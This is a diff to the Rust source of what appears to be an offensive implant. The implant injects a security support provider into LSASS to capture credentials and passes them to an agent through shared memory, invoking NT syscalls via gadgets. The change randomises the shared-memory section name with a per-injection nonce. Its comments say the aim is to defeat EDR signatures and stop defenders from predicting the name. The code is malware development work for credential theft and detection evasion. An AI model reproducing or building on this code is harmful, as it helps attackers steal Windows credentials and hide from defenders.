@@ -59,14 +59,16 @@ pub const SHM_SIZE: usize = 16 + (RING_CAPACITY as usize) * CRED_SLOT_SIZE;
 
 /// Shared memory section name — generated once per agent process.
 ///
-/// Derived from the agent's PSK via HKDF-SHA256 so the name is:
-///   • deterministic per-deployment (SSP in LSASS and agent derive the same name)
+/// Derived from the agent's PSK + a per-injection random nonce via
+/// HKDF-SHA256 so the name is:
 ///   • unique per-deployment (different PSKs produce different names)
+///   • unique per-injection (the random nonce changes each time)
 ///   • not a static string EDR can signature-match
+///   • not derivable from the PSK alone (V4-3-02)
 ///
-/// Format: `Global\` + 32 lowercase hex characters (first 16 bytes of
-/// HKDF-SHA256 output).  The `Global\` prefix ensures cross-session
-/// visibility.  If no PSK is configured, falls back to 32 random bytes.
+/// Format: `Global\` + 32 lowercase hex chars (HKDF of PSK+nonce) + `_`
+/// + 16 hex chars (nonce).  The `Global\` prefix ensures cross-session
+/// visibility.  If no PSK is configured, falls back to random bytes.
 static SHM_NAME: once_cell::sync::Lazy<Vec<u16>> =
     once_cell::sync::Lazy::new(generate_shm_name);
 
@@ -75,28 +77,54 @@ fn invoke_nt_syscall(ssn: u32, gadget_addr: usize, args: &[u64]) -> i32 {
     unsafe { crate::syscalls::do_syscall(ssn, gadget_addr, args) }
 }
 
-/// Derive the shared memory section name from the PSK.
+/// Derive the shared memory section name from the PSK + a random nonce.
 ///
-/// Uses HKDF-SHA256 with the PSK as IKM and a fixed info string to produce
-/// 16 bytes, then hex-encodes them (32 characters) prefixed by `Global\`.
-/// Total length: 7 + 32 = 39 chars, well under the 260-char NT object name limit.
+/// Uses HKDF-SHA256 with (PSK || nonce) as IKM and a fixed info string to
+/// produce 16 bytes, then hex-encodes them (32 characters) prefixed by
+/// `Global\`.  The nonce is appended as `_` + 16 hex chars so that both the
+/// SSP stub (which reads the name from the injected blob) and the agent-side
+/// reader (which uses the same `SHM_NAME` static) agree on the name.
+///
+/// V4-3-02: The nonce ensures the section name is not predictable from the
+/// PSK alone — a defender who compromises the PSK still cannot pre-compute
+/// the section name without observing the nonce at runtime.
+///
+/// Total length: 7 + 32 + 1 + 16 = 56 chars, well under the 260-char NT
+/// object name limit.  As UTF-16LE: 112 bytes + null terminator = 114 bytes,
+/// fitting within the 128-byte (0x80) data-section reservation.
 fn generate_shm_name() -> Vec<u16> {
+    use rand::RngCore;
+
     let psk = crate::outbound::resolve_secret()
         .unwrap_or_else(|| {
             log::warn!("lsa_whisperer_ssp: no PSK configured; SHM name uses random fallback");
             // Fall back to random bytes so the agent still works in dev/test.
-            use rand::RngCore;
             let mut ikm = [0u8; 32];
             rand::rngs::OsRng.fill_bytes(&mut ikm);
             hex::encode(ikm)
         });
 
-    let hkdf = hkdf::Hkdf::<sha2::Sha256>::new(None, psk.as_bytes());
+    // V4-3-02: Per-injection random nonce prevents section name prediction
+    // even if the PSK is known.  The nonce is included in the section name
+    // so both the SSP stub and the agent-side reader agree on the name.
+    let mut nonce = [0u8; 8];
+    rand::rngs::OsRng.fill_bytes(&mut nonce);
+
+    // Combine PSK and nonce as HKDF input keying material.
+    let mut combined_ikm = psk.as_bytes().to_vec();
+    combined_ikm.extend_from_slice(&nonce);
+
+    let hkdf = hkdf::Hkdf::<sha2::Sha256>::new(None, &combined_ikm);
     let mut derived = [0u8; 16];
     hkdf.expand(common::hkdf_info::SSP_SHM, &mut derived)
         .expect("HKDF expand for SSP SHM name must succeed");
 
-    let full = format!("Global\\{}", hex::encode(derived));
+    // Format: Global\{hex_derived}_{hex_nonce}
+    let full = format!(
+        "Global\\{}_{:016x}",
+        hex::encode(derived),
+        u64::from_be_bytes(nonce)
+    );
     let mut wide: Vec<u16> = full.encode_utf16().collect();
     wide.push(0); // null terminator
     wide
@@ -693,8 +721,8 @@ pub fn build_ssp_blob() -> Result<Vec<u8>> {
         blob.extend_from_slice(&w.to_le_bytes());
     }
     // Reserve space for OFF_STORED_BASE (8 bytes, zeroed)
-    // The section name occupies at most ~80 bytes, so pad to 0x80 offset
-    // and ensure 8 bytes for the stored base address.
+    // V4-3-02: The section name is now up to 57 UTF-16LE chars (114 bytes),
+    // padded to 0x80 (128 bytes) with 8 bytes for the stored base address.
     blob.resize(OFF_DATA + OFF_STORED_BASE + 8, 0x00);
     blob.resize(OFF_FT, 0x00);
 
